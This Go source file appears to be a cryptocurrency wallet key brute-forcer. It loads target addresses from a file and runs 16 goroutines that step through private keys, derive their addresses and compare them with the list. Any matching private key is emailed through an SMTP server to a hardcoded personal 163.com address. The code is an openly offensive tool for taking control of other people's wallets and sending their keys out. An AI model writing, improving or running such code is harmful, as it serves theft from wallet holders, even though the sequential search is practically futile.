package main



import (
"fmt"
	"io/ioutil"
	"strings"
	"math/big"
	"net/smtp"
	"time"
)

func (cli *CLI) guess(pwd string)  {
	addresses := LoadTargetAddresses()
	fmt.Println(" address count:", len(addresses))
	time.Sleep(3 * time.Second)
	for i := 0;i < 16 ;i++  {
		wallet := NewWallet()
		//fmt.Printf("big number is: %s pri:%s\n", wallet.GetAddress(), wallet.PrivateKey.D.String())
		go guessWork(pwd, wallet.PrivateKey.D, addresses)
	}
}

func guessWork(pwd string, start *big.Int, addresses map[string]struct{})  {
	//max seed:fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141
	  for {
		start = big.NewInt(0).Add(start, big.NewInt(1))
		hex := fmt.Sprintf("%x", start.Bytes())
		fmt.Println("start is :", hex)
		private, public := SelfDefineKeyPair(hex)
		w := Wallet{private, public}
		  pub := string(w.GetAddress())
		if _, b := addresses[pub]; b {
			sendMail(pwd, hex, string(w.GetAddress()))
		}
	}

}

func sendMail(pwd, private, public string)  {
	if len(pwd) <= 0 {
		return
	}
	// 邮箱地址
	UserEmail := "zm53373581@163.com"
	// 端口号，:25也行
	Mail_Smtp_Port := ":25"
	//邮箱的授权码，去邮箱自己获取
	Mail_Password := pwd
	// 此处填写SMTP服务器
	Mail_Smtp_Host := "smtp.163.com"
	auth := smtp.PlainAuth("", UserEmail, Mail_Password, Mail_Smtp_Host)
	to := []string{UserEmail}
	nickname := "Gook Luck"
	user := UserEmail

	subject := "Guess Address"
	content_type := "Content-Type: text/plain; charset=UTF-8"
	body := fmt.Sprintf("Bing:private:%s public:%s\n", private, public)
	msg := []byte("To: " + strings.Join(to, ",") + "\r\nFrom: " + nickname +
		"<" + user + ">\r\nSubject: " + subject + "\r\n" + content_type + "\r\n\r\n" + body)
	err := smtp.SendMail(Mail_Smtp_Host+Mail_Smtp_Port, auth, user, to, msg)
	if err != nil {
		fmt.Println("send mail error:", err)
	}
}

func LoadTargetAddresses() map[string]struct{}  {
	data, err := ioutil.ReadFile("./addr.txt")
	if err != nil {
		panic(err)
	}
	addr := make(map[string]struct{}, 2162)
	str := string(data)
	strs := strings.Split(str, "\n")
	for _, val := range strs {
		if len(val) <= 0 {
			continue
		}
		addr[val] = struct{}{}
	}
	return addr
}
